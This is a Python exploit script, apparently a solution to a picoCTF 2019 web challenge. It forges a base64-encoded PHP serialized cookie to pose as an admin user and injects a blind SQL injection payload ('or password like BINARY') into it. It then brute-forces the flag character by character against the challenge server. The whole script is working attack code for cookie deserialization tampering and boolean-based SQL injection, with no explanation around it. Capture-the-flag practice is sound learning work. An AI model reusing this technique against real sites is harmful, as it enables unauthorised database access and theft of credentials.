import requests
import base64
import string

adm = {'file':'admin'}
cookie = {'user_info':'TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30='}
content = None
chrs = string.ascii_letters + string.digits + "{}"
data={"user":"asd","pass":"123"}
ser_obj = base64.b64decode(cookie['user_info']).decode('utf-8') # O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}
ser_obj = ser_obj.replace('11:"permissions"','8:"siteuser"')
password = ""
restart = True

while restart:
    for i,v in enumerate(chrs):
      if len(password) > 0 and password[-1] == "}": # We know that password is ending with curly bracket
        restart = False
        break
      query = "' or password like BINARY '" + f'{password + v}%'
      user_i = ser_obj.replace('s:5:"guest"','s:5:"admin"',1).replace('s:5:"guest"',f's:{len(query)}:"{query}"',1)
      print("user_i : ",user_i)
      user_i = base64.b64encode(user_i.encode('utf-8')).decode('utf-8') 
      print("decoded : ",user_i)
      cookie['user_info'] = user_i 
      r = requests.get(
                   "https://2019shell1.picoctf.com/problem/62195/index.php", 
                   cookies=cookie,
                   headers={"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36","Content-Type":"text/html"},
                   params=adm
                   )
      if "Flag" in r.text:
        password += v
        print("Character Found : ",password)
        break
print("PASS : ",password)
